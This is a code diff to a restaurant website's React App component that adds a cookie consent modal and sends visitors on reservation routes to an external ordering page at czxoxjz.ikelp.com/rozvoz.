@@ -31,6 +31,7 @@ import {
 import { Logo } from "./components/Logo";
 import { RezervacePage } from "./components/RezervacePage";
 import { CookieNotice } from "./components/CookieNotice";
+import { CookieConsentModal } from "./components/CookieConsentModal";
 import { translations, Language } from "./translations";
 
 // --- Types ---
@@ -707,6 +708,7 @@ export default function App() {
         hash === "#rezervace" ||
         hash === "#reservations"
       ) {
+        window.location.replace("https://czxoxjz.ikelp.com/rozvoz");
         return "/rezervace";
       }
     }
@@ -725,11 +727,13 @@ export default function App() {
         hash === "#rezervace" ||
         hash === "#reservations"
       ) {
-        setCurrentRoute("/rezervace");
+        window.location.replace("https://czxoxjz.ikelp.com/rozvoz");
       } else {
         setCurrentRoute("/");
       }
     };
+
+    handleNavigationCheck();
 
     window.addEventListener("popstate", handleNavigationCheck);
     window.addEventListener("hashchange", handleNavigationCheck);
@@ -740,6 +744,10 @@ export default function App() {
   }, []);
 
   const navigateTo = (route: string) => {
+    if (route === "/rezervace" || route.startsWith("/rezervace")) {
+      window.location.href = "https://czxoxjz.ikelp.com/rozvoz";
+      return;
+    }
     setCurrentRoute(route);
     if (typeof window !== "undefined") {
       if (window.location.pathname !== route) {
@@ -759,17 +767,21 @@ export default function App() {
 
   if (currentRoute === "/rezervace") {
     return (
-      <RezervacePage
-        lang={lang}
-        setLang={setLang}
-        onNavigateHome={() => navigateTo("/")}
-      />
+      <>
+        <CookieConsentModal lang={lang} />
+        <RezervacePage
+          lang={lang}
+          setLang={setLang}
+          onNavigateHome={() => navigateTo("/")}
+        />
+      </>
     );
   }
 
   return (
     <div className="bg-nubi-black text-nubi-white font-sans selection:bg-nubi-yellow selection:text-nubi-black">
       {loading && <Loader onComplete={() => setLoading(false)} />}
+      <CookieConsentModal lang={lang} />
       <Navbar
         lang={lang}
         setLang={setLang}
